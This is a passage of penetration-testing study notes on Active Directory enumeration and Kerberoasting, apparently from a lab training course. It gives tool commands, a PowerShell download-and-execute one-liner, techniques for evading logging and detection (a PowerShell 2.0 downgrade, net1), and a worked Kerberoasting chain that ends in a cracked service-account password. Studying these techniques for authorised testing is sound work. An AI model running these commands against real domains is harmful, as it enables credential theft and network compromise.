- `-Properties samaccountname,ServicePrincipalName` — Return only these two properties for each matching user

---

### SharpView

**SharpView** is a **.NET port of PowerView** — it does essentially the same things but runs as a compiled C# executable instead of a PowerShell script. This makes it useful when PowerShell is restricted by AppLocker, Constrained Language Mode, or an AV that flags PowerShell-based tools. Since it's a compiled binary, it avoids many PowerShell-based detection mechanisms while providing the same enumeration capabilities.

**Getting help for a SharpView method:**

```powershell
.\SharpView.exe Get-DomainUser -Help
```

**Enumerating information about a specific user:**

```powershell
.\SharpView.exe Get-DomainUser -Identity forend
```

Output includes extensive user attributes: objectsid, samaccounttype, useraccountcontrol, lastlogon, pwdlastset, badPasswordTime, distinguishedname, whenchanged, memberof, badpwdcount, logoncount, and more.

---

### Shares

Domain file shares are worth hunting through carefully. Overly permissive shares can expose sensitive data — credentials in scripts, configuration files, SSH keys, HR data, medical records, financial data, etc. As penetration testers, we want to identify shares our user can access and dig through them for anything useful. PowerView's `Find-DomainShare` and `Find-InterestingDomainShareFile` can help, but for a more thorough and automated hunt, we use **Snaffler**.

---

### Snaffler

**Snaffler** is a tool specifically built for hunting sensitive data across domain file shares. It works by first pulling a list of all hosts in the domain, then connecting to each one to enumerate readable shares and directories, then iterating through every readable file and flagging anything that looks interesting — credentials, config files, private keys, password files, and more. It must be run from a domain-joined host or in the context of a domain user. The real strength of Snaffler is that it does all of this automatically and color-codes results by severity, so we can quickly focus on the highest-value finds. Rather than manually sifting through thousands of files, Snaffler does the heavy lifting and surfaces the ones most likely to contain something useful.

**Running Snaffler:**

```bash
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

**Command Breakdown:**
- `-s` — Prints results to the **console** as they're found (in addition to writing to the log file)
- `-d inlanefreight.local` — The **domain** to enumerate hosts and shares from
- `-o snaffler.log` — Writes all output to a **log file** for later review (and to share with the client as supplemental evidence)
- `-v data` — **Verbosity level**: `data` shows only interesting finds — not every file scanned — which keeps the output manageable

Snaffler color-codes results by severity:
- `{Black}` — Highest value finds (KeePass databases, private keys, etc.)
- `{Red}` — High value (SQL dumps, credential files, key chains)
- `{Green}` — Readable shares found

Because Snaffler generates a lot of data, it's best to let it run and write to the log file, then review the output afterward. The log can also be handed to clients as evidence of exactly which shares are exposing sensitive data.

---

### BloodHound from Windows (SharpHound)

**SharpHound** is the Windows-based data collector for BloodHound, written in C#. While the Linux version (`bloodhound-python`) is great when we only have domain credentials, SharpHound runs directly on a Windows host and can collect more comprehensive data — especially around local group memberships and active sessions. We don't need to be on a domain-joined machine; we can run SharpHound from a Windows attack host that's positioned within the network with domain credentials. The collected data gets zipped up into JSON files which we then upload to the BloodHound GUI for visual analysis.

**Viewing SharpHound options:**

```powershell
.\SharpHound.exe --help
```

Key flags:
- `-c` / `--collectionmethods` — What to collect: Container, Group, LocalGroup, GPOLocalGroup, Session, LoggedOn, ObjectProps, ACL, ComputerOnly, Trusts, Default, RDP, DCOM, DCOnly
- `-d` / `--domain` — Specify the domain to enumerate
- `-s` / `--searchforest` — Search all available domains in the forest (not just the current one)
- `--stealth` — Stealth collection mode, prefers DCOnly methods to reduce network noise
- `-f` — Add a custom LDAP filter to the search
- `--distinguishedname` — Start the LDAP search from a specific DN (useful for targeting a specific OU)
- `--computerfile` — Provide a file of computer names to enumerate instead of auto-discovering

**Running SharpHound:**

```powershell
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

**Command Breakdown:**
- `-c All` — Runs **all** collection methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
- `--zipfilename ILFREIGHT` — Names the output zip file (e.g., `ILFREIGHT_<timestamp>_BloodHound.zip`)

**Example output:**
```
Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
Initializing SharpHound at 1:58 PM on 4/18/2022
Beginning LDAP search for INLANEFREIGHT.LOCAL
Status: 0 objects finished (+0 0)/s -- Using 67 MB RAM
Producer has finished, closing LDAP channel
Status: 3793 objects finished (+3793 63.21667)/s -- Using 112 MB RAM
Status: 3809 objects finished (+16 46.45122)/s -- Using 110 MB RAM
Enumeration finished in 00:01:22.7919186
SharpHound Enumeration Completed at 1:59 PM on 4/18/2022! Happy Graphing
```

3,809 AD objects collected in just over 1 minute and 22 seconds.

**Uploading to BloodHound GUI:**

1. Type `bloodhound` in CMD or PowerShell to launch the GUI
2. If prompted, log in with: `neo4j` / `HTB_@cademy_stdnt!`
3. Click **Upload Data** on the right-hand side
4. Select the newly generated zip file and click **Open**
5. Wait for the Upload Progress window — once all `.json` files show **100%**, click the X to close it

**Browsing the domain node:**

After uploading, type `domain:` in the search bar on the top left and select `INLANEFREIGHT.LOCAL` from the results. The **Node Info** tab gives an instant summary — in this domain we'd see over 550 hosts and trusts with two other domains. Always start here to get a feel for the size and complexity of the environment before running queries.

**Key pre-built analysis queries (Analysis tab):**

- **Find Shortest Paths To Domain Admins** — The most important query. Maps every path from current access to Domain Admin through users, groups, ACLs, GPOs, hosts, and more. Start here for attack path planning.

- **Find Computers with Unsupported Operating Systems** — Shows hosts running Windows 7, Server 2008, etc. These are often vulnerable to legacy exploits like EternalBlue (MS08-067). These systems are common in enterprise environments because they run critical applications that can't be updated. Always **validate whether they are actually powered on** before reporting them — stale AD records of decommissioned machines show up here too. Recommend the client segment them off and start a decommission plan. This can be written up as a high-risk finding or a best practice recommendation for cleaning up old AD records.

- **Find Computers where Domain Users are Local Admin** — Finds any host where the entire Domain Users group has local admin rights. This is a serious misconfiguration — any domain account we compromise immediately gives us local admin on those machines, meaning we can dump credentials from memory. This is often the result of IT departments temporarily granting rights for software installs and never removing them, or over-permissive GPOs applied to groups of hosts.

> **Tip:** Explore the **Node Info** tab when clicking any user, group, or computer — it shows all direct relationships for that object. Paste custom Cypher queries into the **Raw Query** box at the bottom of the screen for targeted searches. Check the **Active Directory BloodHound** module for a deeper dive into custom queries and advanced analysis.

**Operational note:** Document every file transferred to and from hosts in the domain — where it was placed on disk, when it was run, and what it produced. At the end of the engagement, depending on scope, clean up any tools or files you placed in the environment. This protects both us and the client and ensures we can deconflict our activity from anything suspicious the client's team might flag later.

---

## Living Off the Land

### Why Living Off the Land Matters

Sometimes you will be on a host where you cannot load any external tools — the client may have placed you on a managed workstation, you may have landed on a host via exploit and cannot transfer files, or AV/EDR may be blocking everything you try. In these cases, you need to rely entirely on tools and commands that are already built into Windows. This section covers the most useful native commands for AD enumeration.

---

### Basic Enumeration Commands

| Command | Result |
|---|---|
| `hostname` | Prints the PC's name |
| `[System.Environment]::OSVersion.Version` | Prints the OS version and revision level |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host |
| `ipconfig /all` | Prints out network adapter state and configurations |
| `set` | Displays a list of environment variables (from CMD prompt) |
| `echo %USERDOMAIN%` | Displays the domain name to which the host belongs (CMD) |
| `echo %logonserver%` | Prints out the name of the Domain Controller the host checks in with (CMD) |

**Running systeminfo for a comprehensive host overview:**

```cmd
systeminfo
```

`systeminfo` provides a summary of the host's information including OS Name and Version, System Type, Processor(s), BIOS Version, Domain, Logon Server, Hotfix(s), and Network Card(s). Running one command generates fewer logs than running many individual commands separately.

---

### Harnessing PowerShell

**PowerShell** has been part of Windows since 2006 and is the go-to scripting and administration framework for Windows sysadmins. For us as penetration testers, it's one of the most powerful "living off the land" tools available — it's already on every modern Windows host, it can interact with the OS at a deep level, and it gives us access to .NET classes, WMI, COM objects, AD modules, and the full Windows API without dropping a single external tool. We can use PowerShell to enumerate the host and network, query Active Directory, transfer files in and out of the environment, and execute complex attack chains entirely in memory. Knowing how to use PowerShell effectively — and knowing what gets logged and what doesn't — is essential for any internal penetration test.

**Key PowerShell commands for enumeration:**

| Cmdlet | Description |
|---|---|
| `Get-Module` | Lists available modules loaded for use |
| `Get-ExecutionPolicy -List` | Prints the execution policy settings for each scope on a host |
| `Set-ExecutionPolicy Bypass -Scope Process` | Changes the policy for the current process only — reverts when the process ends |
| `Get-ChildItem Env: \| ft Key,Value` | Returns environment values such as key paths, users, and computer information |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Gets the specified user's PowerShell history — may contain passwords or paths to scripts containing passwords |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <follow-on commands>"` | Downloads a file from the web using PowerShell and calls it from memory |

> **Tip:** The PowerShell history file (`ConsoleHost_history.txt`) is one of the most overlooked but valuable files on a Windows host. Administrators frequently type credentials, paths to sensitive scripts, or one-liners directly into PowerShell — all of which get saved here. Always check it early.

**Quick checks using PowerShell:**

```powershell
Get-Module
Get-ExecutionPolicy -List
whoami
Get-ChildItem Env: | ft key,value
```

**Example output from Get-Module:**
```
ModuleType Version    Name                     ExportedCommands
---------- -------    ----                     ----------------
Manifest   1.0.1.0    ActiveDirectory          {Add-ADCentralAccessPolicyMember...}
Manifest   3.1.0.0    Microsoft.PowerShell.Utility  {Add-Member, Add-Type...}
Script     2.0.0      PSReadline               {Get-PSReadLineKeyHandler...}
```

This immediately tells us the ActiveDirectory module is loaded and available — we can start using AD cmdlets right away without needing to import anything.

**Example output from Get-ExecutionPolicy -List:**
```
        Scope ExecutionPolicy
        ----- ---------------
MachinePolicy       Undefined
   UserPolicy       Undefined
      Process       Undefined
  CurrentUser       Undefined
 LocalMachine    RemoteSigned
```

`RemoteSigned` means locally created scripts can run freely — only remotely downloaded scripts need a signature. This is a common setting and means we can run our own PowerShell tools without changing the execution policy.

**Get-ChildItem Env: breakdown:**
- `Get-ChildItem Env:` — Navigates the `Env:` PowerShell drive, which contains all environment variables as items
- `| ft key,value` — Pipes to `Format-Table` displaying Key (variable name) and Value. Reveals the computer name, domain, username, file paths, and other useful enumeration data at a glance.

---

### Downgrade PowerShell

Many defenders don't realize that **multiple versions of PowerShell can exist on the same host**. PowerShell event logging (Script Block Logging) was only introduced in **PowerShell 3.0 and above**. If we downgrade to PowerShell 2.0, our commands will no longer be logged to the PowerShell Operational Event Log — making our actions invisible to defenders who rely on that log for detection.

**Check current version:**

```powershell
Get-host
```

Output shows `Version: 5.1.19041.1320` — the modern version with full logging.

**Downgrade to PowerShell 2.0:**

```powershell
powershell.exe -version 2
```

After running, `Get-host` returns `Version: 2.0` — confirming the downgrade worked. From here, Script Block Logging stops working and our commands no longer appear in the Operational log.

**Important:** The command `powershell.exe -version 2` itself **will be logged** in the current session before the downgrade takes effect. A vigilant defender may notice that logs suddenly stopped for that instance and investigate. Evidence of the downgrade remains — but the commands run inside the v2 session are hidden.

**Where logs are stored:**
- **PowerShell Operational Log:** `Applications and Services Logs → Microsoft → Windows → PowerShell → Operational` (Script Block Logging writes here — stops with v2)
- **Windows PowerShell Log:** `Applications and Services Logs → Windows PowerShell` (records when PowerShell starts — will show a new instance was created in version 2.0)

---

### Checking Defenses

Before running any tools or doing anything noisy, it's worth checking what security controls are active on the host. This helps us understand what we're up against and what tools or techniques might get flagged. The three key things to check are: the **Windows Firewall state**, whether **Windows Defender** is running, and whether **other users are logged into the host** who might notice our activity.

**Checking Windows Firewall profiles:**

```powershell
netsh advfirewall show allprofiles
```

Example output:
```
Domain Profile Settings:
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound

Private Profile Settings:
State                                 OFF

Public Profile Settings:
State                                 OFF
```

All three firewall profiles (Domain, Private, Public) are **OFF** — meaning inbound connections to this host are not blocked by the firewall. This is good for us as attackers and is worth noting as a finding for the client.

**Checking Windows Defender from CMD:**

```cmd
sc query windefend
```

Example output:
```
SERVICE_NAME: windefend
        STATE              : 4  RUNNING
        WIN32_EXIT_CODE    : 0  (0x0)
```

`STATE: 4 RUNNING` means Defender is active. We'll want to check its configuration more deeply with PowerShell.

**Getting detailed Defender status with PowerShell:**

```powershell
Get-MpComputerStatus
```

This gives us the full picture — whether Real-Time Protection is enabled, signature version dates, whether tamper protection is on, and more. The key field is `RealTimeProtectionEnabled` — if `True`, Defender is actively scanning.

**Checking if other users are logged in:**

```powershell
qwinsta
```

Shows all active sessions on the host — session name, username, session ID, and state. If a domain admin is also logged in, we need to be careful about our actions so we don't alert them or interfere with their session.

---

### Network Information

| Networking Commands | Description |
|---|---|
| `arp -a` | Lists all known hosts stored in the arp table. |
| `ipconfig /all` | Prints out adapter settings for the host. We can figure out the network segment from here. |
| `route print` | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
| `netsh advfirewall show allprofiles` | Displays the status of the host's firewall. We can determine if it is active and filtering traffic. |

Commands like `ipconfig /all` and `systeminfo` give us basic network config. The real value comes from `arp -a` and `route print` — `arp -a` shows every host this machine has recently talked to, and `route print` reveals every network segment the host knows how to reach. Any network in the routing table is a potential avenue for lateral movement, because either traffic goes there regularly enough that a route was added, or an admin configured it intentionally. These two commands are especially useful during black box assessments where we need to limit our scanning and want to quietly map out the network from the inside.

---

### Windows Management Instrumentation (WMI)

**WMI (Windows Management Instrumentation)** is a scripting engine built into Windows that's used heavily by system administrators to query and manage both local and remote machines. For us as penetration testers, it's a great "living off the land" tool because it's already on every Windows system — no files to drop, no tools to load. We can use WMI to create detailed reports on domain users, groups, running processes, system accounts, and other information from our host and other domain hosts. Because it uses native Windows functionality, it tends to blend in better with normal admin activity than running external tools.

**Quick WMI commands:**

| Command | Description |
|---|---|
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints patch level and description of Hotfixes applied |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information |
| `wmic process list /format:list` | Listing of all processes on host |
| `wmic ntdomain list /format:list` | Displays information about the Domain and Domain Controllers |
| `wmic useraccount list /format:list` | Displays information about all local accounts and domain accounts that logged in |
| `wmic group list /format:list` | Information about all local groups |
| `wmic sysaccount list /format:list` | Dumps information about any system accounts being used as service accounts |

**Getting domain and trust information:**

```powershell
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
```

Output reveals: the local computer name, the domain it belongs to, the domain forest, and the Domain Controller's address for each known domain (including child domains and external forest trusts).

---

### Net Commands

**Net commands** are built-in Windows command-line tools that let us query both local and remote hosts for information about users, groups, domain controllers, and password policies — no external tools needed. They're simple and fast, making them great for quick reconnaissance. The downside is that `net.exe` commands are commonly monitored by EDR solutions and SIEM tools — running commands like `net user /domain` or `net localgroup administrators` from an unexpected account can immediately trigger alerts. If the assessment requires stealth, use these carefully and consider spacing them out or combining with the `net1` trick below.

**Table of useful Net commands:**

| Command | Description |
|---|---|
| `net accounts` | Information about password requirements |
| `net accounts /domain` | Password and lockout policy for the domain |
| `net group /domain` | Information about domain groups |
| `net group "Domain Admins" /domain` | List users with domain admin privileges |
| `net group "domain computers" /domain` | List of PCs connected to the domain |
| `net group "Domain Controllers" /domain` | List PC accounts of domain controllers |
| `net group <domain_group_name> /domain` | Users that belong to a specific group |
| `net groups /domain` | List of domain groups |
| `net localgroup` | All available local groups |
| `net localgroup administrators /domain` | List users in the administrators group inside the domain (Domain Admins included here by default) |
| `net localgroup Administrators` | Information about the local Administrators group |
| `net localgroup administrators [username] /add` | Add a user to the local administrators group |
| `net share` | Check current shares on the local host |
| `net user <ACCOUNT_NAME> /domain` | Get information about a specific user within the domain |
| `net user /domain` | List all users of the domain |
| `net user %username%` | Information about the currently logged-in user |
| `net use x: \computer\share` | Mount a share locally as a drive letter |
| `net view` | Get a list of computers visible on the network |
| `net view /all /domain[:domainname]` | List shares on the domain |
| `net view \computer /ALL` | List all shares on a specific computer |
| `net view /domain` | List of PCs in the domain |

**Listing Domain Groups:**

```cmd
net group /domain
```

Example output:
```
Group Accounts for \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
-------------------------------------------------------------------------------
*Accounting
*Barracuda_all_access
*Billing
*CEO
*CFO
*Cloneable Domain Controllers
*Domain Admins
*Domain Users
<SNIP>
```

**Getting detailed info about a specific domain user:**

```cmd
net user /domain wrouse
```

Example output:
```
User name                    wrouse
Full Name                    Christopher Davis
Account active               Yes
Password last set            10/27/2021 10:38:01 AM
Password expires             Never
Global Group memberships     *File Share G Drive   *File Share H Drive
                             *Domain Users         *VPN Users
```

This shows us full name, account status, password settings, and group memberships — all useful for understanding what access a user has and whether they're worth targeting.

**Net Commands Trick — using `net1` to bypass basic detection:**

Typing `net1` instead of `net` executes the exact same functions but avoids basic string-matching detection rules that look for the `net` keyword. It's a simple trick but can slip past less sophisticated monitoring setups.

```cmd
net1 user /domain
```

---

### Dsquery

**[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11))** is a built-in Windows command-line tool for finding and querying Active Directory objects. Everything we can do with Dsquery can also be done with BloodHound or PowerView — but we won't always have those tools available. Dsquery's big advantage is that it's a **native tool that sysadmins actually use**, so it blends in naturally with normal activity and is far less likely to raise flags. All we need is elevated privileges or a Command Prompt/PowerShell session running in a `SYSTEM` context.

#### Dsquery DLL

The `dsquery` command is backed by a DLL that ships with every modern Windows system by default:

```
C:\Windows\System32\dsquery.dll
```

This means even on hosts where the full `Active Directory Domain Services` role isn't installed, the underlying library is still present. As long as we have the right privileges, we can use Dsquery anywhere.

**User search:**

```powershell
dsquery user
```

Returns the Distinguished Names (DNs) of all user objects in the domain — e.g., `"CN=forend,OU=IT Admins,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"`.

**Computer search:**

```powershell
dsquery computer
```

Returns the Distinguished Names of all computer objects in the domain.

**Wildcard search on a specific container or OU:**

```powershell
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

**Command Breakdown:**
- `dsquery *` — The `*` wildcard matches **any object class** — users, groups, computers, GPOs, OUs, etc.
- `"CN=Users,DC=INLANEFREIGHT,DC=LOCAL"` — The **base DN** (starting point) for the search — here, the Users container in the domain

**Searching for users with PASSWD_NOTREQD set (no password required):**

```powershell
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```

**Command Breakdown:**
- `dsquery *` — Search all object types
- `-filter "..."` — LDAP filter:
  - `&` — AND: all conditions must match
  - `(objectCategory=person)` — Must be a person category
  - `(objectClass=user)` — Must be a user object
  - `(userAccountControl:1.2.840.113556.1.4.803:=32)` — UAC bit 32 = `PASSWD_NOTREQD` (no password required)
- `-attr distinguishedName userAccountControl` — Return only these two attributes per match

Accounts with `PASSWD_NOTREQD` can authenticate without a password — a significant security risk worth flagging.

**Searching for Domain Controllers:**

```powershell
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

**Command Breakdown:**
- `(userAccountControl:1.2.840.113556.1.4.803:=8192)` — UAC bit 8192 = `SERVER_TRUST_ACCOUNT`, set exclusively on Domain Controller accounts
- `-limit 5` — Return at most 5 results
- `-attr sAMAccountName` — Only return the SAMAccountName

---

### LDAP Filtering Explained

When using Dsquery, `ldapsearch`, or the AD PowerShell module with custom filters, we write **LDAP filter strings** to match specific AD attribute values. The format `userAccountControl:1.2.840.113556.1.4.803:=8192` is a combination of the **attribute name**, an **OID matching rule**, and a **decimal bitmask value**. Here's how each part works:

- `userAccountControl` — The AD attribute being queried. It stores a bitmask of flags describing the account's state (disabled, password never expires, no preauth required, etc.)
- `1.2.840.113556.1.4.803` — The **OID matching rule** — tells LDAP *how* to compare the bit value
- `=8192` — The **decimal bitmask** value we want to match

**UAC Values (common ones):**

| Decimal | Hex | UAC Flag | Meaning |
|---|---|---|---|
| 2 | 0x0002 | ACCOUNTDISABLE | Account is disabled |
| 32 | 0x0020 | PASSWD_NOTREQD | No password required |
| 64 | 0x0040 | PASSWD_CANT_CHANGE | User cannot change password |
| 512 | 0x0200 | NORMAL_ACCOUNT | Standard domain user account |
| 8192 | 0x2000 | SERVER_TRUST_ACCOUNT | Domain Controller account |
| 65536 | 0x10000 | DONT_EXPIRE_PASSWORD | Password never expires |
| 4194304 | 0x400000 | DONT_REQ_PREAUTH | AS-REP Roastable |

These values are bitmasks — they can be combined. A disabled account with a non-expiring password would have UAC value `2 + 65536 = 65538`.

#### OID Match Strings

**1. `1.2.840.113556.1.4.803` — Bitwise AND (exact match)**
The bit value must match **completely**. Use this when searching for a single specific UAC flag.
Example: `(userAccountControl:1.2.840.113556.1.4.803:=64)` finds accounts where exactly `PASSWD_CANT_CHANGE` is set.

**2. `1.2.840.113556.1.4.804` — Bitwise OR (any bit match)**
Returns results if **any bit** in the filter value matches a bit in the attribute. Use when an object might have multiple attributes set and we want to match any of them.

**3. `1.2.840.113556.1.4.1941` — Distinguished Name chain matching**
Matches filters against the **Distinguished Name** of an object, searching through all ownership and membership entries recursively. Useful for finding all members of a group including nested members.

#### Logical Operators

Combine multiple filter conditions using:
- `&` — **AND**: all conditions must match
- `|` — **OR**: any condition may match
- `!` — **NOT**: condition must NOT match

**Example — find users with PASSWD_CANT_CHANGE set:**
```
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))
```

**Example — find users WITHOUT PASSWD_CANT_CHANGE set:**
```
(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))
```

**Example — combine three conditions (active users in person category):**
```
(&(objectClass=user)(objectClass=person)(!userAccountControl:1.2.840.113556.1.4.803:=2))
```

> For a deeper dive into LDAP filter syntax and advanced UAC queries, see the **[Active Directory LDAP](https://academy.hackthebox.com/course/preview/active-directory-ldap)** module.

---

## Kerberoasting - from Linux

### What Kerberoasting Is

**Kerberoasting** is a privilege escalation technique that targets accounts with a **Service Principal Name (SPN)** set. Any domain user — at any privilege level — can request a Kerberos Ticket Granting Service (TGS) ticket for any SPN account in the domain. The TGS ticket is encrypted with the **NTLM hash of the service account's password**. If you can retrieve this ticket and crack it offline, you get the cleartext password for that service account. Service accounts are often members of privileged groups like Domain Admins, and they frequently have weak or reused passwords — making Kerberoasting an extremely effective privilege escalation path.

**What you need:**
- A valid domain user account (any privilege level — even a basic domain user works)
- The IP of a Domain Controller
- A tool to request TGS tickets

You do **not** need local admin access on any machine. From a non-domain-joined Linux host, **Impacket's GetUserSPNs.py** is your best option.

**How the attack works:**
- Any domain user can request a TGS ticket for any SPN account in the same domain
- The TGS ticket (TGS-REP) is encrypted with the service account's NTLM hash
- We retrieve the ticket and crack it offline — no interaction with the target after the initial request
- Service accounts are often configured with weak or reused passwords to simplify administration
- Service accounts often have elevated privileges — local admin on multiple servers, or even Domain Admins group membership

**Efficacy considerations:**
- If we crack a TGS ticket and get Domain Admin credentials → write up as **high-risk** finding
- If we crack tickets but none are for privileged users → still write up as **high-risk** but note the limited impact
- If we cannot crack any tickets even after extensive attempts → write up as **medium-risk** (strong passwords are a mitigating control, but SPNs still exist as a risk)

**Attack methods by platform:**

| Method | Tool | Platform |
|---|---|---|
| From non-domain joined Linux | Impacket's `GetUserSPNs.py` | Linux |
| From domain-joined Linux (as root) | Using the keytab file | Linux |
| From domain-joined Windows (as domain user) | PowerView, Rubeus, setspn.exe | Windows |
| From non-domain joined Windows | `runas /netonly` + tools | Windows |

---

### Installing Impacket

Impacket is pre-installed on most attack hosts, but if you need to install it manually:

```bash
# Clone the Impacket repository
cd /opt
sudo git clone https://github.com/SecureAuthCorp/impacket.git

# Install it
cd impacket
sudo python3 -m pip install .
```

---

### Performing the Attack with GetUserSPNs.py

**Viewing GetUserSPNs.py help options:**

```bash
GetUserSPNs.py -h
```

Key flags:
- `target` — `domain/username[:password]` — the domain and credentials to authenticate with
- `-dc-ip` — IP address of the Domain Controller to query
- `-request` — Request TGS tickets for all found SPN accounts and output them in Hashcat format
- `-request-user` — Request a TGS ticket for a single specific user
- `-outputfile` — Write the TGS ticket hashes to a file instead of printing to screen
- `-save` — Save tickets as `.ccache` files
- `-no-pass` — No password (use with `-k` for Kerberos auth or pass-the-hash)

**Listing SPN accounts:**

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

**Command Breakdown:**
- `GetUserSPNs.py` — The Impacket script for listing and requesting Kerberos TGS tickets for SPN accounts
- `-dc-ip 172.16.5.5` — The Domain Controller's IP address to query
- `INLANEFREIGHT.LOCAL/forend` — The domain and username to authenticate with (will prompt for password)

**Example output:**

```
ServicePrincipalName                           Name               MemberOf                                                  PasswordLastSet             LastLogon
---------------------------------------------  -----------------  --------------------------------------------------------  --------------------------  ---------
backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL       2022-02-15 17:15:40.842452  <never>
sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL       2022-02-15 17:14:48.701834  <never>
MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL        2022-02-15 17:09:46.326865  <never>
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL        2022-02-15 17:10:06.545598  <never>
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL       2022-02-15 17:13:31.639334  <never>
adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange...         2022-02-15 17:15:27.108079  <never>
```

**Key observations from the output:**
- `BACKUPAGENT` and `SOLARWINDSMONITOR` are both members of **Domain Admins** — cracking either of their tickets would give immediate Domain Admin access
- `sqldev` is also a Domain Admin — this is our primary target
- All accounts show `LastLogon: <never>` — these are service accounts not used for interactive login, meaning their passwords may not have been changed in a long time
- Always check the `MemberOf` column first — it tells you exactly how impactful a successful crack would be

**Requesting all TGS tickets:**

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```

**Command Breakdown:**
- `-request` — Requests the TGS ticket for **all** identified SPN accounts and outputs them in Hashcat-compatible format (`$krb5tgs$23$*...*$...`)

**Requesting a single TGS ticket for a specific user:**

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

**Command Breakdown:**
- `-request-user sqldev` — Requests the TGS ticket for only the `sqldev` account instead of all SPN accounts. More targeted and generates less noise.

**Saving the TGS ticket to an output file:**

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

**Command Breakdown:**
- `-outputfile sqldev_tgs` — Writes the TGS hash directly to a file named `sqldev_tgs` for offline cracking. Always use this flag — it's easier to feed files to Hashcat than copy-pasting from terminal.

**Cracking the TGS ticket with Hashcat (RC4 / type 23):**

```bash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

**Command Breakdown:**
- `-m 13100` — Hash mode 13100 = **Kerberos 5, etype 23, TGS-REP** (RC4-HMAC encrypted TGS tickets — the most common type obtained from Kerberoasting)
- `sqldev_tgs` — The file containing the Kerberos TGS hash
- `/usr/share/wordlists/rockyou.txt` — The wordlist to use for cracking

**Cracking result:**

```
$krb5tgs$23$*sqldev$...:database!

Status......: Cracked
Time.Started: Tue Feb 15 17:44:49 2022 (10 secs)
Speed.#1....:   821.3 kH/s
Recovered...: 1/1 (100.00%) Digests
```

Password `database!` cracked in 10 seconds.

**Validating credentials against the DC:**

```bash
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

**Example output:**

```
SMB  172.16.5.5  445  ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (signing:True) (SMBv1:False)
SMB  172.16.5.5  445  ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!)
```

The `(Pwn3d!)` confirms the cracked credentials work **and** that `sqldev` has local admin rights on the DC itself — meaning `sqldev` is effectively a Domain Admin. Full domain compromise achieved from a single cracked TGS ticket.

---

## Kerberoasting - from Windows

### Semi-Manual Method with setspn.exe

Before automated tools like Rubeus existed, Kerberoasting required a more manual approach. It's still useful to know this method in case our tools are blocked. We first enumerate SPNs with the built-in `setspn.exe`, then use PowerShell to request tickets, then Mimikatz to extract them.

**Enumerating SPNs with setspn.exe:**

```cmd
setspn.exe -Q */*
```

**Command Breakdown:**
- `setspn.exe` — The built-in Windows SPN management utility
- `-Q` — **Query** mode: searches for SPNs matching the pattern
- `*/*` — Wildcard pattern matching all SPNs (service class/host) — returns everything

**Example output:**

```
CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
        exchangeAB/ACADEMY-EA-DC01
        TERMSRV/ACADEMY-EA-DC01
        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL

CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        backupjob/veam001.inlanefreight.local

CN=SOLARWINDSMONITOR,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        sts/inlanefreight.local

CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433

Existing SPN found!
```

We focus on **user account SPNs** (not computer accounts) since those are the ones we can Kerberoast. Computer accounts have very long, auto-rotating passwords that are practically impossible to crack.

**Requesting a TGS ticket for a specific SPN using PowerShell:**

```powershell
Add-Type -AssemblyName System.IdentityModel
